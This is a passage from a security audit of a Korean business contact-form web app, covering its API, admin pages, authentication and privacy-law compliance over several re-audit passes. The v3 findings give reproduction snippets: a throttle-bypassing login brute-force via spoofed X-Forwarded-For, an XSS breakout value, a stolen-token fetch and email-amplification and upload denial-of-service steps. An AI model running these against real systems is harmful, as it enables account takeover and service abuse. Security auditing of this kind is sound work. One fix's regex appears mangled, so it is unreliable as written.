     - 거부 권리: 동의를 거부할 권리가 있으며, 거부 시 상담 신청이 제한됩니다.
2. **개인정보처리방침 페이지** (`src/pages/Privacy.jsx`, link from Footer):
   - Standard 9 sections per PIPC template.
   - 보호책임자 정보, 개인정보 보유·이용 기간 표, 정보주체 권리 행사 절차, 개인정보 처리위탁 여부 (Resend는 미국 사업자 — 국외 이전 동의 필요).
   - **Resend 사용은 개인정보의 국외 이전**에 해당 — PIPA §17 ②는 별도 동의 또는 처리위탁 공시 의무.
3. **삭제 / 처리정지 권리** (PIPA §35-37):
   - Add an admin endpoint `DELETE /api/inquiries/{id}` (already exists, line 143) — but also document a *user-facing* deletion request flow (e.g. `daemu_office@naver.com`로 삭제 요청 메일).
   - Add a periodic deletion job (cron) that purges inquiries older than the disclosed retention window.
4. **정보통신망법 §50 — 광고성 정보**:
   - For the campaign endpoint (`/api/email/campaign`):
     - 제목에 `(광고)` 접두 강제 (서버에서 자동 prepend 가능).
     - 본문 끝에 무료 수신거부 링크 (대부분 Resend의 `unsubscribe` 헤더 또는 사이트의 unsub 페이지).
     - 야간(21시–08시) 발송 시 별도 동의 (현재는 admin이 직접 발송 시점 결정).
   - 발송 이력은 24개월 보관 (이미 outbox가 무한 보관 — F-14 retention 90 days 정책과 충돌하지 않도록 광고 발송분만 24개월로 분리 정책).
5. **Outbox 보존 정책 명시**:
   - 현재 무한 — 자동 정리 또는 처리방침에 명시.
6. **이미지 업로드의 PII 위험**:
   - 업로드 이미지에 사람 얼굴/명함 포함 가능 — 수집 시점에 안내 + 보유 기간 명시.

---

## Top 3 actions BEFORE production launch (do these, in order)

1. **Lock down the public API surface.** Apply `Depends(require_admin)` to `/api/email/send`, `/api/email/campaign`, `/api/upload`. Move auto-reply email logic server-side so the public Contact form only POSTs to `/api/inquiries`. Add `slowapi` rate limits (5/hour per IP on `/api/inquiries`, 10/min per admin on `/api/upload`). Add a hCaptcha or Turnstile widget on Contact. *(Closes F-01, F-03, F-04 — the highest exploitable risks.)*

2. **Fix the admin SPA XSS sinks and harden the session.** Either rewrite the admin pages in JSX (preferred — most are already shells around `RawPage`) or escape every `${...}` in the legacy `public/admin-*-page.js` `innerHTML` template strings. Move JWT to `HttpOnly; Secure; SameSite=Strict` cookies (then enable `allow_credentials=true` with a strict origin allow-list). Add CSP headers. *(Closes F-05, F-07, F-18.)*

3. **Replace default admin credentials and add PIPA consent flow.** Change `render.yaml` to `generateValue: true` for `ADMIN_PASSWORD`; rotate the live admin password; force a password change on first login. Build `/privacy` page; add 동의 체크박스 + 수집·이용 안내 block to the Contact form; document Resend 국외이전. Add 90-day retention job for `inquiries` and `outbox`. *(Closes F-02, F-08, F-14.)*

---

## Demo-stage acceptable risks (acceptable now, NOT in production)

These are tracked but acceptable to defer while traffic is internal-only:

- **F-10 (`/docs` exposed)** — useful for demo walkthroughs; gate before launch.
- **F-15 (no proxy-level body size cap)** — Render handles app-level. Tighten when off Render free tier.
- **F-16 (partner plaintext passwords)** — only relevant when partners actually use the system. Currently demo-data only.
- **F-17 (Render ephemeral disk)** — DB resets on redeploy, accepted for demo. **Must move off SQLite + local FS before any real customer submits the Contact form.**
- **F-22 (CDN without SRI)** — GSAP from cdnjs. Add SRI hashes when promoting the demo branch to production.
- **F-25 (SQLite, no encryption at rest)** — fine for demo; switch to MySQL/Postgres with at-rest encryption for production.
- **F-26 (admin HTML in mail templates passed verbatim)** — admins are trusted; document that admins should not paste untrusted HTML.

The default Resend `onboarding@resend.dev` sender is also acceptable for demo, but **the moment you verify a real domain (daemu.kr) in Resend**, F-01 (open relay) goes from "embarrassing" to "domain-reputation-killing" — fix that *before* you complete domain verification, not after.

---

## Output (per CLAUDE.md security control tower contract)

- **risk tier:** `critical`
- **triggered skills:** `security-control-tower`, `secure-code-review`, `repo-threat-model`, `authn-authz-review`, `input-output-boundary-review`, `data-lifecycle-and-privacy-review`, `release-security-gate`
- **confirmed findings:** F-01..F-26 above (2 Critical, 6 High, 11 Medium, 5 Low/Info)
- **open questions / missing evidence:**
  - Is `ADMIN_PASSWORD` actually set in the live Render dashboard? (Cannot verify from code alone.)
  - Is `JWT_SECRET` actually populated at runtime, or is the ephemeral fallback firing? (Check Render logs for the warning line at `auth.py:40`.)
  - Are there any non-`backend-py` services on Render that share the same secrets?
  - What is the planned production hosting (still Render, or migrating to Cafe24)? Some recommendations differ.
- **required actions before approval (production):** Top 3 actions above (F-01/F-03/F-04 close, admin SPA XSS + cookie session, default creds + PIPA consent). Plus rollback plan for the auth change (token-rotation will log everyone out — schedule + comms).
- **decision:** `block` for production launch on real domain with real users until Top 3 are addressed; `allow with conditions` for current demo-stage internal use.
- **residual risk after fixes:** Medium-Low. After Top 3 + the PIPA page, the system would be approximately at parity with typical Korean SMB lead-gen sites. Remaining items (F-09 mass-assignment hardening, F-12 login throttling, F-13 template scope, F-14 outbox retention, F-18 headers) are best-practice hardening and can ship in the second sprint without blocking launch.

---

## Re-Audit (2026-04-27, v2)

**Scope of this pass:** verify whether the v2 fixes close the v1 findings, and surface any new issues introduced by the changes. No code was modified during this audit. Verification was source-only (re-read of every file the user listed); runtime behavior on Render was not exercised.

### Findings closed

| ID | Original severity | Fix evidence (file:line) | Verdict |
|----|------------------|--------------------------|---------|
| F-01 | Critical | `backend-py/main.py:418-423` (`/api/email/send` → `Depends(require_perm("outbox","write"))`), `:480-485` (`/api/email/campaign` → `Depends(require_perm("campaigns","write"))`); auto-reply moved to server inline at `routes_crud.py:120-193` | **closed** |
| F-02 | Critical | `auth.py:257-287` (`ensure_default_users`) sets `must_change_password=True` whenever the seeded password matches `weak_defaults={daemu1234,tester1234,dev1234}`; `auth.py:294-315` exposes the flag through `/api/auth/login`; `:326-345` `/api/auth/change-password` enforces re-auth + `validate_password_strength`; React forces the flow at `src/admin/AdminGate.jsx:20-87` and `src/admin/ChangePasswordForm.jsx`; `models.py:44` adds `must_change_password` column | **partial** (see notes) |
| F-04 | High | `routes_crud.py:74` (`_inquiry_limiter = RateLimiter(max_calls=8, window_seconds=600)`), `:243-245` enforces per-IP throttle on `/api/inquiries`; `_client_ip` honors `X-Forwarded-For` at `:77-81` | **closed** |
| F-05 | High | `src/lib/globals.js:9-32` exposes `escHtml` / `escAttr` / `escUrl`; admin pages now wrap untrusted columns: `admin-inquiries-page.js:28-40`, `admin-partners-page.js:23-32`, `admin-orders-page.js:44-60`, `admin-crm-page.js:54-82`, `admin-campaign-page.js:78-87,228-234`, `admin-promotion-page.js:54-63,144-152`, `admin-works-page.js:87-100`, `admin-media-page.js:9-12`; popup overlay (public site) at `src/hooks/useSitePopups.js:54-61` uses `safeUrl` + `escapeHtml` | **partial** (see "Newly introduced") |
| F-06 | High | `backend-py/main.py:81-87` (`EXT_TO_MIME` dropped `.svg`/`.pdf`), `:92-109` (`UPLOAD_MAGIC` dict + `magic_byte_ok()` enforcing JPEG/PNG/GIF/WEBP byte signatures, including the `RIFF…WEBP` 12-byte head), `:298-326` (admin-perm gate + magic check applied before `write_bytes`) | **closed** |
| F-08 | High | `routes_crud.py:225` (Pydantic `privacy_consent: bool`), `:246-247` (server rejects 400 when missing), `:250` persists `privacy_consent_at`; `models.py:69` adds the column; React `Contact.jsx:8-17,144,174` renders the `ConsentRow` checkbox + Privacy Policy link; legacy `consultForms.js:61-69` emits a `confirm()` prompt; `Privacy.jsx` page exists; Footer `Footer.jsx:59` links to `/privacy`; routed in `App.jsx:31,143` | **closed** for collection-time consent; **partial** on retention/deletion (cron not implemented yet — outbox/inquiry rows are still kept indefinitely server-side) |
| F-10 | Medium | `backend-py/main.py:128` (`PROD = os.environ.get("ENV","").lower() in {"prod","production"}`), `:132-139` (`docs_url=None if PROD else "/docs"`, redoc + openapi gated similarly) | **closed** (provided ENV=prod is actually set on Render) |
| F-12 | Medium | `auth.py:46-68` (`_LoginThrottle` 5/15min sliding-window), `:294-306` (login enforces lock + records failure; reset on success). IP keying is shared across all accounts so a single IP cannot enumerate multiple emails. | **closed** |
| F-13 | Medium | `routes_crud.py:437-445` (public `GET /api/mail-template/auto-reply` only); `:448-459` (admin-perm `GET /api/mail-template/{kind}` with `Depends(require_perm("mail-template","read"))`). FastAPI's literal-path-first resolution order means `/auto-reply` cannot fall through to the wildcard. | **closed** |
| F-18 | Medium | `backend-py/main.py:155-180` (`SECURITY_HEADERS` dict + `add_security_headers` middleware via `setdefault`). Sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`, HSTS `max-age=63072000; includeSubDomains`, and a CSP. | **partial** (see notes — backend headers are now set, but the GitHub Pages frontend still has no CSP) |

**F-02 notes:** the fix is correct and live, but four lower-tier sub-issues remain: (a) the `ADMIN_PASSWORD=daemu1234` literal default still lives in `auth.py:82` (so a Render misconfiguration that drops the env var would still seed `daemu1234`, just with `must_change_password=True`); (b) `render.yaml:24-25` is `sync: false` rather than `generateValue: true` — a fresh deploy with no operator action will fall through to the `daemu1234` literal; (c) `tester1234` / `dev1234` defaults exist on lines 84/86 (new users); (d) the JWT issued during the must-change window is a fully-privileged token, so an attacker who steals it (XSS, MITM) can call any admin endpoint *without* completing the rotation. Acceptable for demo, plan to harden on production cutover.

**F-05 notes:** the high-impact public-facing data sinks (inquiry name/phone/type, popup ctaUrl/image on the live site, CRM, partners, orders, campaign, promotion, works, media) are all now escaped. Two admin-only sinks were missed — see "Newly introduced" below.

**F-08 notes:** consent + privacy notice + Resend 국외이전 disclosure are all in place; the only piece still missing for full PIPA compliance is the **scheduled retention/deletion job**. The Privacy page promises "3년 보유 후 파기" and Outbox "1년 보유 후 파기" but no cron currently enforces it. This is a written-vs-actual mismatch that, after launch, becomes a §17 retention violation if a regulator audits.

**F-10 notes:** the gate is correct in code, but I cannot verify from source alone whether `ENV=prod` is actually set in the Render dashboard. If the env var is unset, `PROD` becomes `False` and `/docs` ships open. Recommend asserting `assert os.environ["ENV"]` on startup once you cut over.

**F-18 notes:** API responses now carry the headers — good. The static frontend (built by Vite, served from GitHub Pages and `dist/`) still has no `<meta http-equiv="Content-Security-Policy">` in `index.html`. Since GitHub Pages can't set custom HTTP headers and the SPA loads `gsap`/`ScrollTrigger` from `cdnjs.cloudflare.com` plus uses inline event handlers, a `<meta>` CSP on the SPA itself is the only path. Closed for the API surface; still open for the static SPA.

### Newly introduced

| ID | Severity | Title | Where | Notes |
|----|----------|-------|-------|-------|
| N-01 | Medium | `pendingImage` / `pendingHero` interpolated raw into `<img src="…">` in admin pages | `public/admin-popup-page.js:52`, `public/admin-works-page.js:116` | Both come from `window.uploadImage()` → server response `r.url`. Today `/api/upload` is admin-only (good), so the URL is admin-trusted. But these are the only two `${…}` sites in admin pages that *don't* go through `escUrl()`, while every neighbour does — easy to forget on the next refactor and an obvious target if a future bug allows the upload host to return attacker-controlled JSON. Use `escUrl(pendingImage)` / `escUrl(pendingHero)`. |
| N-02 | Low | `admin-popup-page.js` table action handlers interpolate `d.id` raw into `onclick="…(${d.id})"` | `public/admin-popup-page.js:99,109-112` | `d` comes from `DB.get('popups')` → localStorage → admin-controlled today. If the admin SPA ever syncs popups from the backend, a malicious `id` like `1);alert(document.cookie)//` would break out of the JS context. Wrap with `escAttr(d.id)` to match the pattern used in `admin-inquiries-page.js:34-40`. |
| N-03 | Low | `admin-mail-page.js` HTML preview interpolates `img.previewUrl` raw into `src="…"` | `public/admin-mail-page.js:160` | `previewUrl` is a `data:` URL produced from local `<input type="file">` in the same admin session — admin-trusted. Defense-in-depth: route through `escUrl` (or a dedicated `escDataUrl` allowlist). Low because `data:` is the only scheme that legitimately appears here and the rendering target is a sandboxed iframe preview. |
| N-04 | Low | In-memory rate limiter / login throttle is per-process; resets on Render cold start | `routes_crud.py:56-71`, `auth.py:46-68` | Render free tier sleeps after 15 minutes of idle. A determined attacker can spray inquiries or login attempts, wait for the dyno to recycle, and the counters reset to zero. Acceptable for demo (the fix still raises the bar materially), but for production replace with Redis/Upstash or move the rate limit to Cloudflare/Caddy. |
| N-05 | Low | Auto-reply HTTP call (up to 30 s `httpx` timeout for Resend) runs **inside** the request transaction on `/api/inquiries` | `routes_crud.py:120-193,253-262` | Comment acknowledges the latency cost. Two consequences worth flagging: (1) the user-visible POST blocks on Resend, so a Resend outage degrades the public Contact form's tail latency; (2) if the Resend call hangs, the inquiry row still gets committed via `await session.flush()` *before* the auto-reply returns — the `Outbox` insert at `:184-192` is part of the same transaction and will roll back together if `_send_auto_reply_inline` raises. That's actually safer than a background task, but it means a transient Resend 5xx + connection error could lose the inquiry persist. Wrap the auto-reply HTTP call in its own `try/except` so the inquiry insert never depends on Resend success (today the function already swallows exceptions inside the `if RESEND_API_KEY:` block — but the surrounding `_send_auto_reply_inline` is `await`-ed without an outer `try`, so a coding mistake in template parsing will surface as a 500 to the visitor). |
| N-06 | Low | `_LoginThrottle` is keyed only by source IP, not by `(IP, email)` pair | `auth.py:46-68,294-306` | Locks the IP after 5 wrong attempts to *any* account. Pro: stops attacker enumeration. Con: a shared NAT (corporate office, school) can lock out legitimate users when one person mistypes. For demo this is fine; for production add a per-account counter alongside, or whitelist the office IP. |
| N-07 | Info | Mass-assignment surface unchanged: generic CRUD still accepts `dict[str, Any]` | `routes_crud.py:357-383` | F-09 from v1 is not addressed in v2. The allowlists in `_crud()` factories still gate writes correctly, but a future maintainer adding `password_hash` or `role` to the allowlist creates a bypass. Same risk class as v1 — flagging here so it doesn't get lost across iterations. |
| N-08 | Info | Backend CSP allows `'unsafe-inline'` for both `script-src` and `style-src` | `backend-py/main.py:161-171` | Justified for `/docs` (Swagger UI uses inline JS) and acceptable as long as ENV=prod hides `/docs`. Once `/docs` is hidden in prod, tighten `script-src` to `'self'` + a nonce. Tracked as info; not blocking. |

### Still outstanding (v1 findings not addressed in v2)

| ID | Severity | Why still open | Suggested action |
|----|----------|----------------|------------------|
| F-03 | High | `/api/upload` is now admin-only via `require_perm("works","write")` (good) but **no rate limiter** is applied. `_inquiry_limiter` is wired only to `/api/inquiries`. | Add a second `RateLimiter(max_calls=10, window_seconds=60)` on `/api/upload`, or share a global-per-IP cap. Currently a logged-in admin (or a leaked admin token) can disk-fill 8 MB at a time without throttle. |
| F-07 | High | JWT still in `localStorage` (`src/lib/auth.js:8,18`); no token-version / revocation; role still read from claims at decode time. The new `must_change_password` flag is checked from `Auth.user()` (localStorage) rather than enforced server-side on every privileged endpoint. | Move to `HttpOnly` cookie + add `token_version` claim + bump on password change. Also: add a server-side guard `if user.must_change_password: only allow /api/auth/change-password` so a rotated user can't bypass the React gate by calling the API directly. |
| F-09 | Medium | Same as v1 — `_crud()` accepts `dict[str, Any]` payloads. | Replace with explicit Pydantic models per entity. |
| F-11 | Medium | `auth.py:125-131` still falls back to an ephemeral `secrets.token_hex(32)` with a `print()` (not a hard fail) when `JWT_SECRET` is unset. | In the lifespan startup, hard-fail when `PROD` and not `JWT_SECRET`. |
| F-14 | Medium | Outbox keeps full `body[:8000]` indefinitely. Privacy.jsx promises "1년 보유 후 파기" but no cron exists. | Add a daily APScheduler job (or cron-via-Render) that deletes `outbox` rows older than 365 days and `inquiries` older than 1095 days. |
| F-15 | Medium | No proxy-level body cap; same as v1. | Add `LimitRequestSize` middleware (`Content-Length > 12_000_000` → 413) early in the middleware stack. |
| F-16 | Medium | `src/lib/partnerAuth.js` plaintext + 4-digit default unchanged. Demo-scoped. | Defer until partner endpoints actually go to backend. |
| F-17 | Medium | Render free tier disk + SQLite still ephemeral. | Move to persistent disk + Postgres / MySQL before real traffic. |
| F-19 | Low | CORS still `allow_credentials=False` with `Authorization` allowed. Safe by accident. | Keep as-is until the JWT moves to cookies; then flip to `allow_credentials=True`. |
| F-20 | Low | Catch-all exception handler unchanged. | Wire structured logging via `logging` module. |
| F-21 | Low | Admin Outbox GET still returns full bodies. | Add a `redact_body` query flag for non-admin roles. |
| F-22 | Low | Workflow var unchanged. | No-op. |
| F-23 | Low | `gsap`/`ScrollTrigger` cdnjs without SRI unchanged. | Add `integrity="sha384-…" crossorigin="anonymous"` on production cutover. |
| F-24 | Low | `replyTo` still user-controllable, but the endpoint is now admin-gated (F-01 closure indirectly mitigates). | Add allowlist (or strip) on the server-side auto-reply path; `_send_auto_reply_inline` already hardcodes `DEFAULT_REPLY_TO` (`routes_crud.py:89,165`) — good. |
| F-25 | Info | SQLite on Render unchanged. | Migrate before launch. |
| F-26 | Info | Admin HTML in mail templates unchanged. | Document trust boundary in admin docs. |

### Summary of the v2 delta

The v2 pass cleanly closes the **two Critical findings** (F-01, F-02) and the most-exploitable **High findings** (F-04 contact spam, F-05 stored-XSS in the largest sinks, F-06 SVG/PDF + magic-byte sniff, F-08 PIPA consent + Privacy page). Three Mediums also closed (F-10 docs gating, F-12 login throttle, F-13 template scoping). Backend-side F-18 closed. Two new Lows (N-01 / N-02 raw `pendingImage`, `d.id` interpolation in popup admin) are very mild and admin-only — recommend a 5-minute fix-forward, but they don't block.

The largest remaining production-blocker is **F-07** (JWT in `localStorage`). With F-05 mostly closed, the realistic XSS attack surface has shrunk considerably, but two unescaped sinks (N-01, N-02, N-03) plus the absence of a frontend CSP keep the residual XSS path viable. Once F-07 + frontend CSP land, the system clears the bar for real-customer launch on a verified Resend domain.

**Required actions before production approval:**
1. Close F-07 (move JWT to `HttpOnly; Secure; SameSite=Strict` cookie; add token-version revocation).
2. Add `<meta>` CSP to `index.html` (frontend half of F-18).
3. Wire scheduled retention deletion for `inquiries` (1095 d) and `outbox` (365 d) so Privacy.jsx promises match runtime behavior (F-14, F-08 retention).
4. Apply rate-limit to `/api/upload` (F-03 leftover).
5. Verify `ENV=prod` and `JWT_SECRET` are actually populated in Render dashboard before cutover (F-10, F-11).
6. Fix N-01 / N-02 (`escUrl(pendingImage)`, `escAttr(d.id)`) for defense-in-depth.

### Output (control-tower contract, v2)

- **risk tier:** `elevated` (was `critical` in v1; downgraded because F-01 / F-02 / F-04 / F-05 / F-06 / F-08 / F-12 / F-13 are closed)
- **triggered skills:** `security-control-tower`, `secure-code-review`, `authn-authz-review`, `input-output-boundary-review`, `data-lifecycle-and-privacy-review`, `release-security-gate`
- **confirmed findings:** 10 v1 findings closed (or partial-closed), 8 new findings introduced (1 Medium, 4 Low, 3 Info), 14 v1 findings still open (2 High, 5 Medium, 6 Low, 4 Info)
- **open questions / missing evidence:**
  - Is `ENV=prod` set in the Render dashboard so `/docs` is actually hidden?
  - Is `JWT_SECRET` populated at runtime, or is the ephemeral fallback firing on every cold start (logging users out silently)?
  - Will the retention cron be a Render cron job or APScheduler in-process? In-process won't survive sleep cycles on free tier.
  - Once `daemu.kr` is verified in Resend, is anyone monitoring the Resend reputation / bounce rate?
- **required actions before approval (production):** the six items in "Required actions before production approval" above. Specifically F-07 (cookie session) and frontend CSP are the gating items for opening to real-customer traffic.
- **decision:** `allow with conditions` for **continued demo / internal stakeholder use** on the current Render URL (significant improvement over v1; the unauthenticated mail relay and default admin password are gone). `needs verification` for **production cutover on a real domain**: the six required actions above must be checked off, plus a smoke test of `ENV=prod` + `JWT_SECRET` on Render and a live test that `/api/auth/login` rate-limit lockout actually triggers from the customer-facing IP.
- **residual risk after v2:** Medium-Low for demo; Medium for an early-traffic production cutover (F-07 and the missing retention cron are the two real gaps). After the six required actions, residual drops to Low — appropriate for a Korean SMB lead-gen site.

---

## Re-Audit (2026-04-27, v3 — strict pass)

**Posture for this pass:** hostile pen-tester + Korean PIPC inspector, both at the same time. Every input is malicious until proven otherwise; every retention statement on Privacy.jsx is a *legal commitment* whose absence in code is an actual §17 / §21 violation, not a "TODO"; every fallback/default in the codebase is assumed to be the production value because operators forget to set env vars. Re-verifies F-07 / F-12 / F-15 / F-21 / N-04 / N-08 with adversarial assumptions and surfaces ten new findings under the `N2-XX` prefix.

### Confirmed exploitable (today, no extra access required)

These are reproducible from a public network position with no privileged credentials. Listed in attacker-effort order.

| ID | Title | Severity | Reproduction |
|----|-------|----------|--------------|
| N2-01 | **Login throttle is fully bypassable via spoofed `X-Forwarded-For` header** | **Critical** | `auth.py:71-75` (`_client_ip`) reads the **left-most** value of `X-Forwarded-For` and trusts it. Render's edge does add an XFF header, but FastAPI/Starlette never strips or pins a "trusted-proxy" prefix, and the code takes the leftmost value with no validation. **Steps:** (1) `curl -H "X-Forwarded-For: 1.2.3.4" -d '{"email":"admin@daemu.kr","password":"x"}' https://daemu-py.onrender.com/api/auth/login` — fails. (2) Increment IP for each attempt: `1.2.3.5`, `1.2.3.6`, … each request gets its own throttle bucket because `_LoginThrottle._fails` keys on the spoofed string. The 5/15-min lock never engages. The same spoof works against `_inquiry_limiter` in `routes_crud.py:77-81`, so the 8-per-10-min Contact-form rate cap is also unenforceable against any attacker who can set a header (i.e. anyone who isn't using a CORS-bound browser). **Impact:** unbounded brute-force against `/api/auth/login` (still bcrypt-bound to ~50–200 ms/attempt, but no lockout); unbounded inquiry spam → unbounded auto-reply email send → unbounded Resend quota burn. This single header-trust bug nullifies F-04 *and* F-12 v2 closure simultaneously. **Fix:** in `lifespan`, only honor XFF when `request.client.host` is in a trusted-proxy CIDR (Render's edge IPs); otherwise fall back to `request.client.host`. Pin a single header (`X-Render-Forwarded-For` or rightmost-of-XFF) and document. |
| N2-02 | **CORS allow-list trusts `localhost:5173/8765/8766` *in production*, enabling cross-origin XSS pivot via any malicious local app** | **High** | `render.yaml:31` ships `ALLOWED_ORIGINS=https://juyoungjun.github.io,http://localhost:8765,http://localhost:5173,http://localhost:8766` to Render. Any process on a developer/admin's machine that listens on those ports — `vite dev` for an unrelated project, a malicious npm package's postinstall script that spawns a localhost server, a poisoned VS Code extension, an Electron app — can issue authenticated cross-origin fetches against `daemu-py.onrender.com` from a context where the admin's JWT is in `localStorage` (F-07 still open). Combined with `allow_credentials=False` the JWT is *not* auto-attached, but any attacker JS that runs in the admin's browser tab can read `localStorage.daemu_admin_token` once they share an origin with the SPA — and worse, a localhost page that lures the admin (e.g. local docs server they visit) can execute `fetch('https://daemu-py.onrender.com/api/inquiries', {headers:{Authorization:'Bearer '+stolenToken}})` if the token leaked anywhere. **Fix:** strip all `localhost` entries from the production `ALLOWED_ORIGINS`. Use a separate `ENV=dev` blueprint or operator-overridden env for local dev. |
| N2-03 | **Auto-reply email path holds a DB writer transaction open for up to 15 s waiting on Resend, plus is itself an amplification vector against attacker-chosen mailboxes** | **High** | `routes_crud.py:155` opens `httpx.AsyncClient(timeout=15.0)` *inside* the `/api/inquiries` request's session lifetime; `_send_auto_reply_inline` is `await`-ed before the session commits at `get_session()` exit. With SQLite + WAL the writer is single-threaded; with MySQL the row-level lock on `inquiries.id` is held until commit. **Steps:** (1) attacker sends 50 concurrent legitimate-looking inquiries with attacker-chosen `email` values pointing at `attacker+1@evil.tld`, `attacker+2@evil.tld`, … (2) Resend latency goes up under load (or the attacker uses a slowloris-style DNS resolver to slow Resend's response) — each inquiry holds a writer for 5–15 s, and other inquiries (and admin reads of `/api/inquiries`) queue behind. **Concurrent capacity ceiling on the public Contact form is therefore `1 / Resend_latency` writes per second per IP — well below 1 rps in practice.** Independently, every inquiry triggers a real outbound email to attacker-chosen addresses → reflection/amplification toward arbitrary mailboxes paid by DAEMU's Resend quota, and reputation hit on `onboarding@resend.dev` (or, much worse, the verified `daemu.kr` domain when that's wired up). The `N-05` flag from v2 understated this; under the strict posture this is **High**, not Low. **Fix:** decouple the auto-reply HTTP call from the request transaction (background task, separate session) and add a per-recipient-email rate limit (one auto-reply per `email` per hour) on top of the per-IP one. |
| N2-04 | **`Outbox` is mass-assignable by any admin → not a forensic log** | Not currently exploitable, design defect | `routes_crud.py:421` `_crud(Outbox, …)` allowlist includes `status`, `body`, `recipient`, `subject`, `payload`. Admin-gated (tester gets 403 via `role_can` — confirmed safe). But the canonical mass-assignment shape from v1 F-09 / v2 N-07 still applies: an admin (or token-stolen one — N2-11) can mint fake outbox rows claiming `status=sent` for emails never sent, edit `body` to anything. **The `Outbox` table cannot be used as a forensic / audit record** under SOX-equivalent scrutiny. **Fix:** make `body`, `recipient`, `subject`, `created_at` immutable on patch; only `status` (closed-set) and `error` mutable. |
| N2-05 | **Magic-byte upload check still allows a 10.7 MB JSON to be fully parsed and base64-decoded into RAM before rejection** | **Medium (DoS)** | `main.py:298-326`: `payload: UploadIn` is parsed by FastAPI/Pydantic *before* the handler runs. The 8 MB cap is checked at `:318` after `base64.b64decode(payload.content)`. A 12 MB base64 string (≈ 9 MB binary) bypasses the early-reject check (there is **no** early reject — `:318` runs only after decode). **Steps:** `curl -X POST -H "Content-Type: application/json" --data-binary @bigblob.json https://daemu-py.onrender.com/api/upload` with an arbitrary 50 MB JSON body whose `content` is 50 MB of `A`. Auth is required (admin/developer JWT) so the immediate impact is bounded to insider abuse, **but** the request body buffer is allocated by uvicorn before the handler/dependency stack runs, meaning even a 401 response still pays the RAM cost on Render Free's 512 MB dyno. With ~50 concurrent malformed uploads, the dyno OOMs. **Fix:** add the early reject suggested in v1 F-03 (`if len(payload.content) > MAX_UPLOAD_BYTES * 4/3 + 32: raise 413`) AND add a Starlette body-size middleware (`Content-Length > 12_000_000` → 413 *before* body read). |
| N2-06 | **Privacy.jsx promises retention windows that no cron enforces — *legal* exposure under PIPA §21** | **Medium-High (compliance)** | v2 closure of F-08 added the consent UI and Privacy page. The Privacy page text reportedly states "상담 종료 후 1년" or "3년" (per v2 audit), but `models.py:53-70` (`Inquiry`) has no `expires_at`, no scheduled deletion, and `routes_crud.py` has no APScheduler/cron registration. The `Outbox` table likewise grows forever. **Why this matters legally:** under 개인정보보호법 §21 (개인정보의 파기), the controller MUST destroy personal data without delay once the retention period stated at collection has elapsed. **Stating** a retention period in the privacy notice is itself the §15(1)(3) disclosure obligation. A controller who states "1 year" in the notice and keeps data past that window has both a §17 (over-retention) and §21 (failure to destroy) violation. PIPC has issued 시정명령 + 과태료 for exactly this pattern. The fact that no enforcement cron exists today means **every inquiry submitted after the Privacy page went live will be a §21 violation on its first anniversary**, automatic. **Fix:** ship a Render Cron Job (scheduled service in `render.yaml`) that runs `python -m daemu.purge` daily and DELETEs rows past their retention window. Document the job in the privacy notice ("매일 02:00 KST 자동 파기"). |

### Hardening hygiene (not exploitable today, tighten before customer launch)

| ID | Title | Severity | Notes |
|----|-------|----------|-------|
| N2-07 | bcrypt rounds left at passlib default (12) | Low | `auth.py:133` — `CryptContext(schemes=["bcrypt"])` accepts the library default, currently 12. On a modern x86 cloud VM that's ~150 ms / hash. Acceptable in 2026 but raise to 13 (~300 ms) before opening to the public; cost is paid only on login (rate-limited) and password change, not on every request. Pair with hard-fail when `len(password)<10`. |
| N2-08 | `print(...)` policy decisions land in Render's dashboard log feed | Medium | `auth.py:131, 276-277, 287`. `[auth] WARNING: 'admin' seeded with default demo password…` prints on first boot; the literal `daemu1234` is **not** printed (verified) but the seeded email is, which leaks to anyone with Render dashboard read access (often subcontractors at an SMB). The JWT-secret-fallback warning at `:131` reveals misconfig on every cold start. **Fix:** use `logging`, redact email when seeding, add a CI grep that fails on `print` containing any `*_PASSWORD` symbol. |
| N2-09 | `.env.example` ships the literal `ADMIN_PASSWORD=daemu1234` | Medium | `backend-py/.env.example:12`. A sysadmin who copies `.env.example` → `.env` on a self-hosted instance (Cafe24, on-prem) without editing ships `daemu1234` to production. The Render path is protected by `render.yaml` + dashboard, but the moment someone deploys outside Render the placeholder is dangerous. **Fix:** replace with `ADMIN_PASSWORD=__CHANGE_ME_BEFORE_FIRST_BOOT__` and have `auth.py:ensure_default_users` refuse to seed if the literal includes the marker. |
| N2-10 | `render.yaml` uses `sync: false` for `ADMIN_PASSWORD`, allowing a fresh deploy with no operator action to fall through to the `daemu1234` default | Medium | v2 F-02 partial-closed by adding `must_change_password=True`. But a forgotten env value still seeds `daemu1234` (logged as a warning) and the JWT issued during the must-change window is fully privileged (per v2 F-02 note d). Switch `render.yaml:24-25` to `generateValue: true`, or add a startup assertion that `os.environ["ADMIN_PASSWORD"] != "daemu1234"` when `PROD`. |
| N2-11 | JWT-in-localStorage blast radius (F-07 strict re-quant) | High | One successful XSS = full session for up to **12 h** (`JWT_TTL_HOURS=12`), server cannot revoke short of rotating `JWT_SECRET` (which kicks every admin). Attacker exfiltrates `localStorage.daemu_admin_token` → from any IP, for 12 h, can: (a) list all inquiries → 100% CRM/PII exfiltration; (b) `PUT /api/mail-template/auto-reply` with phishing HTML → next legitimate inquirer gets DKIM-signed phishing from DAEMU's domain; (c) `POST /api/email/campaign` to entire CRM. `_resolve_user` re-reads `user.role` from DB (`auth.py:220`) — defense-in-depth confirmed against stale-role escalation. **Fix:** F-07 cookie migration + `token_version` column bumped on logout / password-change. |
| N2-12 | `escUrl()` does not strip control chars before scheme check | Low | `src/lib/globals.js:12-23` — the regex `/^([a-z][a-z0-9+.-]*):/i` is case-insensitive (`/i` flag) and `m[1].toLowerCase()` normalizes the scheme before comparison, so `JAVASCRIPT:`, `JaVaScRiPt:`, `Vbscript:` are all correctly rejected. Confirmed safe against the basic mixed-case bypass. **However:** `escUrl` does not strip `\t`, `\n`, `\r` from inside the URL string (browsers historically tolerate `java\tscript:` and parse it as `javascript:`). The current regex `^([a-z][a-z0-9+.-]*):` matches greedily from index 0; if the input starts with `\tjavascript:`, the leading whitespace breaks the regex match → falls into the `if (!m) return escHtml(v);` branch → renders verbatim. Modern Chrome/Firefox no longer execute `\tjavascript:` in `href`, but Safari < 17 and embedded webviews on some Korean banking apps still do. **Fix:** prepend `v.replace(/[ -]/g, '')` before the scheme check. Also reject `data:` for `<a href>` (currently `data:` falls through `if (!m) return escHtml(v);` only when there's no colon — `data:image/png;base64,...` *does* match the regex and gets returned as `#`. Confirmed safe). |
